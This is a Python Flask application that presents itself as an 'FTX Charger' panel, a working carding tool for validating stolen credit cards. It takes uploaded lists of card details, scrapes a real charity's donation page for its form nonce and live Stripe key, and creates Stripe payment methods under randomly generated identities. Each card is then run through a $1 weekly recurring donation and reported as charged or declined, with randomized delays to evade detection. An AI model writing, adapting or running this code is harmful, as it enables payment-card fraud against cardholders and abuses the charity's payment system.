# app.py
from flask import Flask, request, render_template_string, redirect, url_for, session, jsonify
import os
import re
import time
import random
import string
import threading
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ─── STATE ──────────────────────────────────────────────────────────────
check_results = []
is_checking = False
stop_flag = False
total_cards = 0
check_lock = threading.Lock()

# ─── HELPERS ────────────────────────────────────────────────────────────
def random_name():
    first = random.choice(["Aiden", "Liam", "Noah", "Ethan", "Mason", "Olivia", "Emma", "Ava", "Sophia", "Isabella"])
    last  = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"])
    return first, last

def random_address():
    cities  = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio"]
    states  = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX"]
    streets = ["Main Street", "Park Avenue", "Elm Street", "Oak Lane", "Pine Road", "Maple Drive"]
    zips    = ["10001", "90001", "60601", "77001", "85001", "19103", "78205"]
    i = random.randrange(len(cities))
    return cities[i], states[i], f"{random.randint(100,9999)} {random.choice(streets)}", zips[i]

def random_email():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)) + "@gmail.com"

def check_ccs(cc_lines):
    global is_checking, stop_flag, total_cards

    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"

    with check_lock:
        total_cards = len(cc_lines)
        check_results.clear()
        is_checking = True
        stop_flag = False

    s = requests.Session()

    for idx, line in enumerate(cc_lines, 1):
        with check_lock:
            if stop_flag:
                check_results.append((idx, line.strip(), "STOPPED BY USER"))
                break

        line = line.strip()
        if '|' not in line:
            continue

        try:
            num, mm, yy_full, cvc = [x.strip() for x in line.split('|')]
            yy = yy_full[-2:]
            ccstr = line
        except:
            check_results.append((idx, line, "FORMAT ERROR"))
            continue

        try:
            r = s.get("https://pipelineforchangefoundation.com/donate/", headers={"User-Agent": ua}, timeout=15)
            soup = BeautifulSoup(r.text, "html.parser")

            formid = soup.find("input", {"name": "charitable_form_id"})["value"]
            nonce  = soup.find("input", {"name": "_charitable_donation_nonce"})["value"]
            cap    = soup.find("input", {"name": "campaign_id"})["value"]
            pk_live = re.search(r'"key":"(pk_live_[^"]+)"', r.text).group(1)
        except Exception as e:
            check_results.append((idx, ccstr, f"PAGE LOAD FAIL — {str(e)[:70]}"))
            continue

        fn, ln = random_name()
        city, state, addr, zipc = random_address()
        email = random_email()

        pm_data = {
            "type": "card",
            "billing_details[name]": f"{fn} {ln}",
            "billing_details[email]": email,
            "billing_details[address][city]": city,
            "billing_details[address][country]": "US",
            "billing_details[address][line1]": addr,
            "billing_details[address][postal_code]": zipc,
            "billing_details[address][state]": state,
            "card[number]": num,
            "card[cvc]": cvc,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "key": pk_live,
        }

        try:
            pm_r = requests.post("https://api.stripe.com/v1/payment_methods", data=pm_data, headers={"User-Agent": ua}, timeout=12)
            pm_id = pm_r.json()["id"]
        except Exception as e:
            check_results.append((idx, ccstr, f"PM CREATION FAIL — {str(e)[:80]}"))
            continue

        donation_data = {
            "charitable_form_id": formid,
            formid: "",
            "_charitable_donation_nonce": nonce,
            "campaign_id": cap,
            "description": "Support",
            "ID": "742502",
            "recurring_donation": "yes",
            "donation_amount": "recurring-custom",
            "custom_recurring_donation_amount": "1.00",
            "recurring_donation_period": "week",
            "first_name": fn,
            "last_name": ln,
            "email": email,
            "address": addr,
            "city": city,
            "state": state,
            "postcode": zipc,
            "country": "US",
            "gateway": "stripe",
            "stripe_payment_method": pm_id,
            "action": "make_donation",
        }

        try:
            ajax_r = s.post(
                "https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php",
                data=donation_data,
                headers={
                    "User-Agent": ua,
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": "https://pipelineforchangefoundation.com/donate/",
                },
                timeout=20
            )

            txt = ajax_r.text.lower()
            if "thank you" in txt or "successfully" in txt:
                status = "CHARGED 1.00$ ✅"
            elif "requires_action" in txt:
                status = "3DS / ACTION REQUIRED"
            else:
                status = f"DECLINED — {txt[:140]}..."
        except Exception as e:
            status = f"REQUEST FAIL — {str(e)[:90]}"

        check_results.append((idx, ccstr, status))
        time.sleep(random.uniform(4.0, 8.5))

    with check_lock:
        is_checking = False

# ─── HTML ────────────────────────────────────────────────────────────────

LOGIN_HTML = """<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>FTX Panel • Login</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@2/css/pico.classless.min.css"/>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap"/>
  <style>
    :root { --primary: #00d4ff; --primary-dark: #00a0cc; --bg: #0d1117; --card: #161b22; }
    body { background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); color: #e6e6e6; font-family: 'Segoe UI', system-ui; min-height: 100vh; display: grid; place-items: center; margin: 0; }
    .card { background: rgba(22, 27, 34, 0.92); backdrop-filter: blur(10px); border: 1px solid rgba(0,212,255,0.18); border-radius: 16px; padding: 2.8rem 2.4rem; max-width: 420px; width: 90%; box-shadow: 0 20px 50px rgba(0,0,0,0.6); }
    h1 { font-family: 'Orbitron', sans-serif; color: var(--primary); text-align: center; font-size: 2.4rem; margin-bottom: 1.8rem; letter-spacing: 2px; text-shadow: 0 0 15px rgba(0,212,255,0.5); }
    input { background: rgba(255,255,255,0.06); border: 1px solid rgba(0,212,255,0.3); color: white; border-radius: 10px; padding: 1rem; margin: 0.8rem 0; transition: all 0.3s; }
    input:focus { border-color: var(--primary); box-shadow: 0 0 0 4px rgba(0,212,255,0.25); outline: none; }
    button { background: linear-gradient(90deg, #00d4ff, #0077b6); border: none; color: white; font-weight: 600; padding: 1rem; border-radius: 10px; cursor: pointer; transition: all 0.3s; width: 100%; margin-top: 1rem; font-size: 1.1rem; }
    button:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(0,212,255,0.4); }
    .error { color: #ff6b6b; text-align: center; margin-top: 1rem; font-weight: 500; }
  </style>
</head>
<body>
  <div class="card">
    <h1>FTX CHARGER</h1>
    <form method="POST">
      <input type="text"     name="username" placeholder="Username"  required autofocus>
      <input type="password" name="password" placeholder="Password"  required>
      <button type="submit">LOGIN</button>
    </form>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
  </div>
</body>
</html>"""

PANEL_HTML = """<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>FTX • Stripe Charger</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@2/css/pico.classless.min.css"/>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Roboto+Mono:wght@400;700&display=swap"/>
  <style>
    :root { --primary: #00d4ff; --primary-dark: #00a0cc; --bg: #0d1117; --card: #161b22; --danger: #ff4d4d; --success: #00ff9d; }
    body { background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); color: #e0e0e0; font-family: 'Segoe UI', system-ui; min-height: 100vh; margin: 0; padding: 2rem 1rem; }
    .container { max-width: 1100px; margin: 0 auto; }
    h1 { font-family: 'Orbitron', sans-serif; color: var(--primary); text-align: center; font-size: 2.8rem; margin-bottom: 0.8rem; letter-spacing: 3px; text-shadow: 0 0 20px rgba(0,212,255,0.6); }
    .subtitle { text-align: center; color: #a0a0c0; margin-bottom: 2.5rem; font-size: 1.15rem; }
    .card { background: rgba(22,27,34,0.92); backdrop-filter: blur(12px); border: 1px solid rgba(0,212,255,0.16); border-radius: 16px; padding: 2rem; box-shadow: 0 20px 60px rgba(0,0,0,0.55); margin-bottom: 2rem; }
    input[type="file"] { width: 100%; padding: 1.2rem; background: rgba(255,255,255,0.05); border: 2px dashed rgba(0,212,255,0.4); border-radius: 12px; color: white; cursor: pointer; transition: all 0.3s; }
    input[type="file"]:hover { border-color: var(--primary); background: rgba(0,212,255,0.08); }
    button { background: linear-gradient(90deg, var(--primary), #0099cc); border: none; color: white; font-weight: 600; padding: 1rem 2rem; border-radius: 12px; cursor: pointer; transition: all 0.3s; font-size: 1.1rem; }
    button:hover { transform: translateY(-3px); box-shadow: 0 12px 30px rgba(0,212,255,0.45); }
    button.stop { background: linear-gradient(90deg, #ff4d4d, #cc0000); }
    button.stop:hover { box-shadow: 0 12px 30px rgba(255,77,77,0.5); }
    textarea { width: 100%; height: 260px; font-family: 'Roboto Mono', monospace; background: #0d1117; color: #e0ffe0; border: 1px solid #30363d; border-radius: 10px; padding: 1.2rem; margin: 1.2rem 0; resize: vertical; font-size: 0.96rem; }
    table { width: 100%; border-collapse: collapse; margin-top: 1.5rem; font-family: 'Roboto Mono', monospace; }
    th, td { padding: 12px 10px; text-align: left; border-bottom: 1px solid #30363d; }
    th { background: rgba(0,212,255,0.12); color: var(--primary); font-weight: 600; }
    .success { color: var(--success); font-weight: 700; }
    .danger  { color: var(--danger);   font-weight: 700; }
    .warn    { color: #ffcc00;         font-weight: 600; }
    .status-bar { text-align: center; font-size: 1.3rem; margin: 1.5rem 0; color: #a0ffc0; font-weight: 500; text-shadow: 0 0 10px rgba(0,255,157,0.4); }
  </style>
</head>
<body>
  <div class="container">
    <h1>FTX CHARGER</h1>
    <p class="subtitle">Stripe 1$ Recurring Donation Checker</p>

    <div class="card">
      {% if not is_checking %}
      <form method="post" enctype="multipart/form-data">
        <input type="file" name="ccfile" accept=".txt" required>
        <button type="submit">START CHECKING</button>
      </form>
      {% else %}
      <div class="status-bar">Processing {{ len(check_results) }} / {{ total_cards }} cards</div>
      <button class="stop" onclick="stopChecking()">STOP CHECKING</button>
      {% endif %}
    </div>

    {% if check_results %}
    <div class="card">
      <button onclick="copyResults()">Copy All Results</button>
      <textarea id="results">{{ '\n'.join([f"{i} | {cc} | {res}" for i,cc,res in check_results]) }}</textarea>

      <table>
        <thead>
          <tr><th>#</th><th>CC</th><th>Result</th></tr>
        </thead>
        <tbody>
          {% for i, cc, res in check_results %}
          <tr>
            <td>{{ i }}</td>
            <td style="font-family: 'Roboto Mono', monospace;">{{ cc }}</td>
            <td class="{% if 'CHARGED' in res %}success{% elif 'DECLINED' in res or 'FAIL' in res %}danger{% else %}warn{% endif %}">{{ res }}</td>
          </tr>
          {% endfor %}
        </tbody>
      </table>
    </div>
    {% endif %}
  </div>

  <script>
    function copyResults() {
      navigator.clipboard.writeText(document.getElementById("results").value)
        .then(() => alert("Results copied to clipboard!"));
    }
    function stopChecking() {
      if (confirm("Really stop checking?")) {
        fetch("/stop", { method: "POST" })
          .then(() => location.reload());
      }
    }
    {% if is_checking %}
    setTimeout(() => location.reload(), 6500);
    {% endif %}
  </script>
</body>
</html>"""

# ─── ROUTES ─────────────────────────────────────────────────────────────

@app.route("/", methods=["GET", "POST"])
def login():
    try:
        if request.method == "POST":
            u = request.form.get("username", "").strip()
            p = request.form.get("password", "").strip()
            if u == "admin" and p == "ftx123":
                session["logged"] = True
                return redirect("/panel")
            return render_template_string(LOGIN_HTML, error="Invalid credentials")
        return render_template_string(LOGIN_HTML)
    except Exception as e:
        return f"<h1>Login crash</h1><pre>{str(e)}</pre>", 500

@app.route("/panel", methods=["GET", "POST"])
def panel():
    global is_checking, stop_flag

    try:
        if not session.get("logged"):
            return redirect("/")

        if request.method == "POST" and not is_checking:
            f = request.files.get("ccfile")
            if f and f.filename.lower().endswith(".txt"):
                try:
                    lines = [l.decode("utf-8", errors="ignore").strip() for l in f.stream if b'|' in l]
                    if lines:
                        threading.Thread(target=check_ccs, args=(lines,), daemon=True).start()
                except:
                    pass

        return render_template_string(PANEL_HTML,
                                     is_checking=is_checking,
                                     check_results=check_results,
                                     total_cards=total_cards)
    except Exception as e:
        return f"<h1>Panel crash</h1><pre>{str(e)}</pre>", 500

@app.route("/stop", methods=["POST"])
def stop():
    global stop_flag
    with check_lock:
        stop_flag = True
    return jsonify({"status": "stopping"})

if __name__ == '__main__':
    app.run(debug=True, port=5000, host="0.0.0.0")
